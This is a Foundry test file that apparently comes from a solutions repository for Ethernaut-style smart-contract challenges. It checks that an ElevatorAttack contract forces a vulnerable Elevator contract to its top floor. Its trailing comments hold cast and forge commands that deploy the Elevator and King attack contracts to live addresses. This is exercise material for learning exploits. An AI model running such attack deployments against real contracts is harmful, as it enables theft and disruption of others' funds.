// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Elevator} from "../src/Elevator.sol";
import {ElevatorAttack} from "../solutions/ElevatorAttack.sol";

contract ElevatorTest is Test {
    Elevator public elevator;
    ElevatorAttack public attackContract;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        elevator = new Elevator();
    }

    function test_goToTopFloor() public {
        vm.startPrank(attacker);

        // deploy attack contract
        attackContract = new ElevatorAttack(address(elevator));

        assertTrue(!elevator.top());

        attackContract.attack();

        assertTrue(elevator.top());

        vm.stopPrank();
    }
}

/* 
source .env
export king=0xa07046c092EA2fc7ec173cD7C2F00221aD7892B7
cast call $king "owner()" --rpc-url $RPC_URL
cast call $king "prize()" --rpc-url $RPC_URL
cast call $king "_king()" --rpc-url $RPC_URL
forge create solutions/KingAttack.sol:KingAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $king
export attack=0x329E3EA36DE43b067b95B6FaC47e5F751A43bE1F
cast send $attack "attack(address)" $king --value 0.01ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/

/* 
source .env
export elevator=0x09673A57c07958F3C4b6687240FbCE23eCe47E82
cast call $elevator "top()" --rpc-url $RPC_URL
forge create solutions/ElevatorAttack.sol:ElevatorAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $elevator
export attack=0xB14317c914804102Bd3A6f9Fc1Abe5A52605d1e3
cast send $attack "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
